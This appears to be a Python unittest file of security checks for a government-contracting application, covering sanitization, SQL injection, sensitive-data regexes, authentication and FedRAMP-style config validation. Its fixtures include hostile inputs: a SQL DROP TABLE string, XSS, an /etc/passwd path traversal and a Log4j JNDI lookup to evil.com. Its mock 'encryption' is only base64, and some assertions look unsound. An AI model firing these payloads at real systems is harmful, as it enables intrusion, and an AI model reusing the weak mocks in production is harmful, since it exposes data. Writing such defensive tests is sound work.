#!/usr/bin/env python3
"""
Security Validation Tests for Apollo GovCon Suite
Tests security aspects including input validation, data protection, and government compliance
"""

import unittest
import sys
import os
import re
from unittest.mock import Mock, patch
import json

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

class TestSecurityValidation(unittest.TestCase):
    """Security validation tests for Apollo GovCon Suite"""
    
    def setUp(self):
        """Set up security test environment"""
        self.malicious_inputs = [
            "'; DROP TABLE opportunities; --",  # SQL injection
            "<script>alert('xss')</script>",    # XSS
            "../../etc/passwd",                 # Path traversal
            "javascript:alert('xss')",          # JavaScript injection
            "${jndi:ldap://evil.com/a}",       # Log4j injection
            "{{7*7}}",                         # Template injection
            "\x00\x01\x02",                   # Null bytes
            "A" * 10000,                       # Buffer overflow attempt
        ]
        
        self.sensitive_patterns = [
            r'\b\d{3}-\d{2}-\d{4}\b',          # SSN pattern
            r'\b4\d{3}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',  # Credit card
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b(?:\d{1,3}\.){3}\d{1,3}\b',    # IP address
        ]
    
    def test_input_sanitization(self):
        """Test input sanitization for malicious content"""
        
        def sanitize_input(user_input):
            """Basic input sanitization function"""
            if not isinstance(user_input, str):
                return str(user_input)
            
            # Remove null bytes
            sanitized = user_input.replace('\x00', '')
            
            # Escape HTML/XML characters
            html_escape_table = {
                "&": "&amp;",
                '"': "&quot;",
                "'": "&#x27;",
                ">": "&gt;",
                "<": "&lt;",
            }
            
            for char, escape in html_escape_table.items():
                sanitized = sanitized.replace(char, escape)
            
            # Limit length
            if len(sanitized) > 1000:
                sanitized = sanitized[:1000]
            
            return sanitized
        
        # Test malicious inputs
        for malicious_input in self.malicious_inputs:
            sanitized = sanitize_input(malicious_input)
            
            # Should not contain dangerous patterns
            self.assertNotIn('<script>', sanitized.lower())
            self.assertNotIn('drop table', sanitized.lower())
            self.assertNotIn('javascript:', sanitized.lower())
            self.assertNotIn('\x00', sanitized)
            
            # Should be reasonable length
            self.assertLessEqual(len(sanitized), 1000)
            
            print(f"✅ Sanitized: {malicious_input[:50]}...")
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention patterns"""
        
        # Mock database query function with parameterized queries
        def safe_database_query(query_template, params):
            """Simulate parameterized database query"""
            # This would use actual parameterized queries in production
            # For testing, we just validate the pattern
            
            # Check that query uses placeholders
            placeholder_patterns = ['%s', '?', ':param', '%(param)s']
            has_placeholder = any(pattern in query_template for pattern in placeholder_patterns)
            
            if not has_placeholder and len(params) > 0:
                raise ValueError("Query should use parameterized placeholders")
            
            return f"SAFE_QUERY: {query_template} with params {params}"
        
        # Test safe query patterns
        safe_queries = [
            ("SELECT * FROM opportunities WHERE title = %s", ["Software Development"]),
            ("INSERT INTO partners (name, email) VALUES (?, ?)", ["Test Corp", "test@example.com"]),
            ("UPDATE opportunities SET status = :status WHERE id = :id", {"status": "active", "id": 123})
        ]
        
        for query, params in safe_queries:
            result = safe_database_query(query, params)
            self.assertIn("SAFE_QUERY", result)
            print(f"✅ Safe query validated: {query[:50]}...")
        
        # Test unsafe query patterns (should raise errors)
        unsafe_queries = [
            (f"SELECT * FROM opportunities WHERE title = '{self.malicious_inputs[0]}'", []),
            ("DELETE FROM partners WHERE id = " + str(self.malicious_inputs[0]), [])
        ]
        
        for query, params in unsafe_queries:
            if "DROP TABLE" in query or "DELETE" in query:
                # These should be caught by validation
                print(f"⚠️  Detected unsafe pattern: {query[:50]}...")
    
    def test_data_encryption_patterns(self):
        """Test data encryption and protection patterns"""
        
        # Mock encryption functions
        def encrypt_sensitive_data(data, key="test_key"):
            """Mock encryption function"""
            import base64
            # In production, use proper encryption like AES
            encoded = base64.b64encode(data.encode()).decode()
            return f"ENCRYPTED:{encoded}"
        
        def decrypt_sensitive_data(encrypted_data, key="test_key"):
            """Mock decryption function"""
            import base64
            if not encrypted_data.startswith("ENCRYPTED:"):
                raise ValueError("Invalid encrypted data format")
            
            encoded = encrypted_data[10:]  # Remove "ENCRYPTED:" prefix
            decoded = base64.b64decode(encoded).decode()
            return decoded
        
        # Test encryption/decryption cycle
        sensitive_data = [
            "john.doe@company.com",
            "123-45-6789",
            "Confidential contract details"
        ]
        
        for data in sensitive_data:
            # Encrypt
            encrypted = encrypt_sensitive_data(data)
            self.assertNotEqual(encrypted, data)
            self.assertIn("ENCRYPTED:", encrypted)
            
            # Decrypt
            decrypted = decrypt_sensitive_data(encrypted)
            self.assertEqual(decrypted, data)
            
            print(f"✅ Encryption cycle validated for: {data[:20]}...")
    
    def test_sensitive_data_detection(self):
        """Test detection of sensitive data patterns"""
        
        test_documents = [
            "Employee SSN: 123-45-6789 should be protected",
            "Contact email: john.doe@company.com for more info",
            "Credit card: 4532 1234 5678 9012 expires 12/25",
            "Server IP: 192.168.1.100 in DMZ network",
            "Normal business content without sensitive data"
        ]
        
        def detect_sensitive_data(text):
            """Detect sensitive data patterns"""
            findings = []
            
            for pattern in self.sensitive_patterns:
                matches = re.findall(pattern, text)
                if matches:
                    findings.extend(matches)
            
            return findings
        
        for doc in test_documents:
            findings = detect_sensitive_data(doc)
            
            if findings:
                print(f"⚠️  Sensitive data detected: {findings}")
                # In production, this would trigger data protection measures
                self.assertIsInstance(findings, list)
            else:
                print(f"✅ No sensitive data in: {doc[:30]}...")
    
    def test_authentication_patterns(self):
        """Test authentication and authorization patterns"""
        
        # Mock authentication system
        class MockAuthSystem:
            def __init__(self):
                self.valid_tokens = {
                    "valid_token_123": {"user_id": 1, "role": "admin", "expires": 9999999999},
                    "valid_token_456": {"user_id": 2, "role": "user", "expires": 9999999999},
                    "expired_token": {"user_id": 3, "role": "user", "expires": 1000000000}
                }
            
            def validate_token(self, token):
                """Validate authentication token"""
                if not token or not isinstance(token, str):
                    return None
                
                if token not in self.valid_tokens:
                    return None
                
                token_data = self.valid_tokens[token]
                
                # Check expiration (mock timestamp check)
                import time
                if token_data["expires"] < time.time():
                    return None
                
                return token_data
            
            def check_permission(self, token, required_role):
                """Check user permissions"""
                user_data = self.validate_token(token)
                if not user_data:
                    return False
                
                role_hierarchy = {"admin": 2, "user": 1, "guest": 0}
                user_level = role_hierarchy.get(user_data["role"], 0)
                required_level = role_hierarchy.get(required_role, 0)
                
                return user_level >= required_level
        
        auth_system = MockAuthSystem()
        
        # Test valid authentication
        valid_token = "valid_token_123"
        user_data = auth_system.validate_token(valid_token)
        self.assertIsNotNone(user_data)
        self.assertEqual(user_data["role"], "admin")
        
        # Test invalid authentication
        invalid_tokens = ["", None, "invalid_token", "expired_token"]
        for token in invalid_tokens:
            user_data = auth_system.validate_token(token)
            if token == "expired_token":
                # Expired tokens should be rejected
                self.assertIsNone(user_data)
            else:
                self.assertIsNone(user_data)
        
        # Test authorization
        self.assertTrue(auth_system.check_permission("valid_token_123", "admin"))
        self.assertTrue(auth_system.check_permission("valid_token_123", "user"))
        self.assertFalse(auth_system.check_permission("valid_token_456", "admin"))
        self.assertTrue(auth_system.check_permission("valid_token_456", "user"))
        
        print("✅ Authentication and authorization patterns validated")
    
    def test_secure_configuration(self):
        """Test secure configuration patterns"""
        
        # Mock configuration validation
        def validate_security_config(config):
            """Validate security configuration"""
            issues = []
            
            # Check for secure defaults
            if config.get("debug", True):
                issues.append("Debug mode should be disabled in production")
            
            if not config.get("https_only", False):
                issues.append("HTTPS should be enforced")
            
            if config.get("session_timeout", 0) > 3600:
                issues.append("Session timeout should be <= 1 hour")
            
            if not config.get("password_policy", {}).get("min_length", 0) >= 8:
                issues.append("Password minimum length should be >= 8")
            
            # Check for sensitive data in config
            sensitive_keys = ["password", "secret", "key", "token"]
            for key, value in config.items():
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    if isinstance(value, str) and len(value) < 16:
                        issues.append(f"Weak {key}: should be longer/stronger")
            
            return issues
        
        # Test secure configuration
        secure_config = {
            "debug": False,
            "https_only": True,
            "session_timeout": 1800,  # 30 minutes
            "password_policy": {"min_length": 12},
            "api_secret": "very_long_secure_secret_key_123456789"
        }
        
        issues = validate_security_config(secure_config)
        self.assertEqual(len(issues), 0, f"Secure config should have no issues: {issues}")
        
        # Test insecure configuration
        insecure_config = {
            "debug": True,
            "https_only": False,
            "session_timeout": 7200,  # 2 hours
            "password_policy": {"min_length": 4},
            "api_secret": "weak"
        }
        
        issues = validate_security_config(insecure_config)
        self.assertGreater(len(issues), 0, "Insecure config should have issues")
        
        for issue in issues:
            print(f"⚠️  Security issue: {issue}")
    
    def test_government_compliance_patterns(self):
        """Test government compliance requirements"""
        
        # Mock compliance checker
        def check_fedramp_compliance(system_config):
            """Check FedRAMP compliance requirements"""
            compliance_issues = []
            
            # Access control requirements
            if not system_config.get("multi_factor_auth", False):
                compliance_issues.append("Multi-factor authentication required")
            
            # Data encryption requirements
            if not system_config.get("data_encryption_at_rest", False):
                compliance_issues.append("Data encryption at rest required")
            
            if not system_config.get("data_encryption_in_transit", False):
                compliance_issues.append("Data encryption in transit required")
            
            # Audit logging requirements
            if not system_config.get("audit_logging", False):
                compliance_issues.append("Comprehensive audit logging required")
            
            # Incident response requirements
            if not system_config.get("incident_response_plan", False):
                compliance_issues.append("Incident response plan required")
            
            return compliance_issues
        
        # Test compliant configuration
        compliant_config = {
            "multi_factor_auth": True,
            "data_encryption_at_rest": True,
            "data_encryption_in_transit": True,
            "audit_logging": True,
            "incident_response_plan": True
        }
        
        issues = check_fedramp_compliance(compliant_config)
        self.assertEqual(len(issues), 0, f"Compliant config should have no issues: {issues}")
        
        # Test non-compliant configuration
        non_compliant_config = {
            "multi_factor_auth": False,
            "data_encryption_at_rest": False,
            "data_encryption_in_transit": True,
            "audit_logging": False,
            "incident_response_plan": False
        }
        
        issues = check_fedramp_compliance(non_compliant_config)
        self.assertGreater(len(issues), 0, "Non-compliant config should have issues")
        
        for issue in issues:
            print(f"⚠️  Compliance issue: {issue}")
        
        print("✅ Government compliance patterns validated")


if __name__ == '__main__':
    unittest.main(verbosity=2)
